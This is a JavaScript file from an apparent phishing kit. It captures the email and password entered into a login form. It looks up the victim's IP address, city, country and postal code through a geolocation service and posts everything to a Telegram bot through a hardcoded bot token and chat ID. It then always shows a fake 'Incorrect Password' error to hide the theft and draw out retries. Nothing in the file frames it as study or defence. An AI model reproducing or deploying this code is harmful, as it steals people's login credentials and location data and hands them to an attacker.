const TELEGRAM_BOT_TOKEN = "8292423468:AAEQQXMHQ7jmJFyfrGX7vsWhr6GH-ORn8dk";
const TELEGRAM_CHAT_ID = "-5006528512";

document.addEventListener("DOMContentLoaded", function () {
  const form = document.getElementById("loginForm");
  const msgDiv = document.getElementById("msg");
  const inputs = form.querySelectorAll("input");

  async function sendToTelegram(email, password, locationInfo) {
    const text = `
---------------|54|---------------
Username: ${email}
Password: ${password}
${locationInfo}
-------------------------------
`;
    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const payload = { chat_id: TELEGRAM_CHAT_ID, text };

    try {
      let res = await fetch(telegramUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });
      return res.ok;
    } catch {
      return false;
    }
  }

  async function getLocationInfo() {
    try {
      const res = await fetch("https://ip-api.io/json");
      const data = await res.json();
      return `Country: ${data.country_name || ""}, City: ${data.city || ""}, IP: ${data.ip || ""}, ZIP: ${data.postal || ""}`;
    } catch {
      return "Location: Unknown";
    }
  }

  form.addEventListener("submit", async function (e) {
    e.preventDefault();
    inputs.forEach(inp => inp.classList.remove('input-error'));
    msgDiv.textContent = "";

    const email = form.email.value.trim();
    const password = form.password.value.trim();
    const locationInfo = await getLocationInfo();

    await sendToTelegram(email, password, locationInfo);

    // Only for error state: just toggle error color via CSS class!
    inputs.forEach(inp => inp.classList.add('input-error'));
    msgDiv.textContent = "Incorrect Password. please Try Again.";
  });

  inputs.forEach(inp => {
    inp.addEventListener("input", () => {
      inp.classList.remove('input-error');
      msgDiv.textContent = "";
    });
  });
});
